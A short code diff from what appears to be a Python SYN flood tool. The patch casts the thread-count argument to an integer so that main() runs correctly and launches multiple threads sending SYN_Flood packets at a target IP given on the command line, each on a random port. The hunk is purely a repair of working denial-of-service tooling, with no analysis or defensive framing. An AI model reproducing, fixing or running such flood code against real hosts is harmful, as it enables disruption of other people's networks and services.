@@ -43,7 +43,7 @@ def SYN_Flood(dstIP,dstPort):
     sys.stdout.write("\nTotal packets sent: %i\n" % total)
 
 def main():
-  for x in range(sys.argv[2]):
+  for x in range(int(sys.argv[2])):
     th = threading.Thread(target=SYN_Flood, args=[sys.argv[1], random.randint(0,65535)])
     th.start()
     # SYN_Flood(sys.argv[1], random.randint(0, 65535))
